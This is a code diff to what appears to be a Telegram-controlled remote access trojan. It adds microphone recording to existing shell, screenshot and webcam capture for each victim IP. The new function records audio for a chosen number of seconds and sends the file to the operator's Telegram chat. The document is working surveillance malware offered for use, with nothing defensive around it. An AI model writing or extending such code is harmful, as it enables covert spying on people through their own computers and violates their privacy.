@@ -8,6 +8,8 @@ import os
 import mss
 from PIL import Image
 import cv2
+import sounddevice as sd
+import wave
 
 TOKEN = "bot-token"
 bot = telebot.TeleBot(TOKEN)
@@ -69,7 +71,8 @@ def callback_query(call):
         button_shell = types.InlineKeyboardButton("Shell", callback_data=f"shell_{ip}")
         button_screenshot = types.InlineKeyboardButton("Screenshot", callback_data=f"screenshot_{ip}")
         button_webcam = types.InlineKeyboardButton("Webcam", callback_data=f"webcam_{ip}")
-        markup.add(button_shell, button_screenshot, button_webcam)
+        button_record_audio = types.InlineKeyboardButton("Record Audio", callback_data=f"recordaudio_{ip}")
+        markup.add(button_shell, button_screenshot, button_webcam, button_record_audio)
         bot.send_message(call.message.chat.id, f"Select task for: {clients[ip]} ({ip}):", reply_markup=markup)
     elif call.data.startswith("shell_"):
         ip = call.data.split('_')[1]
@@ -81,6 +84,10 @@ def callback_query(call):
     elif call.data.startswith("webcam_"):
         ip = call.data.split('_')[1]
         send_webcam_image(call.message, ip)
+    elif call.data.startswith("recordaudio_"):
+        ip = call.data.split('_')[1]
+        bot.send_message(call.message.chat.id, f"How many seconds to record audio for {clients[ip]} ({ip})?")
+        bot.register_next_step_handler(call.message, record_audio, ip)
 
 def execute_command(message, ip):
     command = message.text
@@ -126,6 +133,31 @@ def send_webcam_image(message, ip):
         cap.release()
     except Exception as e:
         bot.send_message(message.chat.id, f"Webcam error: {e}")
+
+def record_audio(message, ip):
+    try:
+        duration = int(message.text)
+        temp_folder = get_temp_folder()
+        audio_path = os.path.join(temp_folder, f"audio_{ip}.wav")
+        
+        fs = 44100  
+        seconds = duration 
+        bot.send_message(message.chat.id, f"Recording audio for {seconds} seconds...")
+        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait() 
+        
+        with wave.open(audio_path, 'wb') as wf:
+            wf.setnchannels(2) 
+            wf.setsampwidth(2)  
+            wf.setframerate(fs)
+            wf.writeframes(recording.tobytes())
+        
+        with open(audio_path, "rb") as audio_file:
+            bot.send_audio(message.chat.id, audio_file)
+        
+        os.remove(audio_path)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Recording error: {e}")
 
 def monitor_clients():
     while True:
